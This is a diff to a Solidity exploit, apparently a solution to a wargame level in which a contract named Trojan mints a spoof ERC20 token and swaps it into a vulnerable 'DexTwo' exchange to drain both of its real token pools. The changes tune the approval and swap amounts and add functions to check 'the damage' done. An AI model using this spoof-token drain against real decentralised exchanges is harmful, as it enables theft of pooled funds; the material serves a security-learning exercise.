@@ -3,7 +3,6 @@ pragma solidity ^0.8.0;
 
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
-import '@openzeppelin/contracts/math/SafeMath.sol';
 import '@openzeppelin/contracts/access/Ownable.sol';
 import './DexTwo.sol';
 
@@ -26,12 +25,22 @@ contract Trojan {
     function inject() public {
         uint amount = 100;
         // set allowance for dex in from to msg.sender
-        spoofToken.approve(address(this), address(dexTwo), amount);
+        spoofToken.approve(address(this), address(dexTwo), amount * 3);
 
         // call swap using our spooftoken to drain all token1s out of dex2's liquidity pool 
-        dexTwo.swap(spoofToken, token1, amount);
+        dexTwo.swap(address(spoofToken), token1, amount);
         // call swap again using spooftoken to drain all token2s out of dex2's liquidity pool
-        dexTwo.swap(spoofToken, token2, amount);
+        // keep in mind that balanceOf(spoofToken, dexTwo) is now 200!!! Since 100 were minted and then 100 exchanged for token1
+        dexTwo.swap(address(spoofToken), token2, amount * 2);
+    }
+
+    // in case you want to check the damage we've done to dexTwo :) *also testing
+    function checkBalance1() public view returns (uint) {
+        return dexTwo.balanceOf(token1, address(dexTwo));
+    }
+
+    function checkBalance2() public view returns (uint) {
+        return dexTwo.balanceOf(token2, address(dexTwo));
     }
 }
 
@@ -41,7 +50,7 @@ contract SpoofToken is ERC20 {
 
     constructor(address dexInstance, string memory name, string memory symbol) ERC20(name,symbol) {
         _dex = dexInstance;
-        _mint(msg.sender, 200);
+        _mint(msg.sender, 300);
         _mint(_dex, 100);
     }
 
